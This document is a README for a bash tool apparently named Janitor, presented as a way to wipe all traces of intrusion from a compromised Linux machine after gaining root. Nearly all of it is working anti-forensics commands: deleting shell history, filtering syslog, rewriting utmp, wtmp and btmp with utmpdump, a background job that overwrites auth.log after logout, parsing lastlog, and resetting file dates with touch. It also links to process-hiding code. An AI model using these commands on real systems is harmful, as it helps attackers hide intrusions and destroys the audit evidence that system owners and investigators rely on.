# Janitor
Smalll bash script to scrub any and all logs/traces of malicious activity of a penetrated linux box.

## Leaving things as you found them
Once root access is gained to a system, one should remove any trace of themselves in the authlog, syslog, histfile (.bash_history for root and whatever user) as well as utmp, wtmp, and btmp (if you had any failed login attempts) and any other logs.

Note: I still need to expand the slept background processes to more than just auth.log

### Masking your history
As both whatever user you logged in as, and as root:
``` bash
set +o history
history
history -d <number preceding set +o history>
```
history is stored in `$HISTFILE` which you can also edit manually.

### Scrub syslog
Any programs you use that write to syslog should be cleared, so it's worth looking through `/var/log/syslog` to see if you've left any traces other than starting your session. To clear that,
`cat /var/log/syslog | grep -v "user\s" > tmp && mv tmp > /var/log/syslog`

### Scrub lastlog
`lastlog` shows the last time each user has logged in, and the ssh login message seems to print the previous value of `lastlog` for the user.

I need to determine the binary format of `lastlog` in order to edit/overwrite it. A good starting point would be reversing this terse perl script: 

```perl
perl -we '$recs = ""; while (<>) {$recs .= $_};$uid = 0;foreach (split(/(.{292})/s,$recs)) {next if length($_) == 0;my ($binTime,$line,$host) = $_ =~/(.{4})(.{32})(.{256})/;if (defined $line && $line =~ /\w/) {$line =~ s/\x00+//g;$host =~ s/\x00+//g;printf("%5d %s %8s %s\n",$uid,scalar(gmtime(unpack("I4",$binTime))),$line,$host)}$uid++}print"\n"' < /var/log/lastlog
```

Even better: https://github.com/krig/utils/blob/master/lastlog/lastlog.c

### Clearing utmp, wtmp, and btmp
``` bash
utmpdump /var/run/utmp > file.txt
             /log/wtmp
                 /btmp
```
then, edit file.txt (manually or using shell commands e.g. `cat file.txt | grep -v searchterm` to filter out any lines that contain `searchterm`) before doing
``` bash
utmpdump -r < file.txt > /var/run/utmp
                             /log/wtmp
                                 /btmp
```
                         
### Replacing auth.log (note: should also do this after logout, using sleep)

#### Example: (after sshing in as ubuntu and `sudo su`ing) 
(sleep 9 && cat /var/log/auth.log | grep -v "root\|ubuntu\|logind" > tmp && mv tmp  /var/log/auth.log)&

### Masking modification dates
Use `touch` to change the dates of files modified back to their original values.

### Notes

Are there process logs, or any other logs I'm missing?

Idea: Use btmp for a script with geoip api + mapbox to show where all the failed logins are coming from realtime

### Links
After writing this, found these nifty links:

  * http://www.theparticle.com/files/txt/hacking/hackingunix/hacking_unix-part3.txt

  * http://www.hcidata.info/lastlog.htm

  * https://github.com/krig/utils/blob/master/lastlog/lastlog.c

  * https://www.freedesktop.org/wiki/Software/systemd/journal-files/

  * http://www.phrack.org/issues/49/6.html#article

  * http://www.phrack.org/issues/51/6.html#article

  *  https://www.rsyslog.com/doc/master/configuration/filters.html
  
  *  https://docs.fedoraproject.org/en-US/Fedora/23/html/System_Administrators_Guide/s1-interaction_of_rsyslog_and_journal.html

  * https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/
  * https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c

  * https://stackoverflow.com/questions/12977179/reading-living-process-memory-without-interrupting-it-proc-kcore-is-an-option
  
  * https://www.cyberciti.biz/faq/howto-linux-unix-killing-restarting-the-process/
  send SIGHUP to force process to reload config file. `pkill -HUP rsyslogd`

  * https://www.microsoft.com/en-us/research/wp-content/uploads/2016/02/subvirt.pdf

  * https://unix.stackexchange.com/questions/355216/getting-output-from-netcat-decoding-it-and-returning-an-output
